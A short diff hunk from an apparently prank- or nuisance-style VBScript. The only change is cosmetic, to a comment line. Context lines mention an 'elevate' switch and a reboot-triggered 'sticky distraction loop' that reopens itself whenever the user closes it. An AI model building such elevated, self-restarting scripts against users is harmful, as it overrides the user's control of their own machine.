@@ -32,7 +32,7 @@ If WScript.Arguments.Named.Exists("elevate") Then
     End If
 End If
 
-' --- STEP 3: THE "STICKY" DISTRACTION LOOP ---
+' --- STEP 3: THE "STICKY" DISTRACTION LOOP -------
 ' This runs on reboot (/task). If they close it, it re-opens until 30s is up.
 startTime = Timer
 Do While Timer < startTime + 30
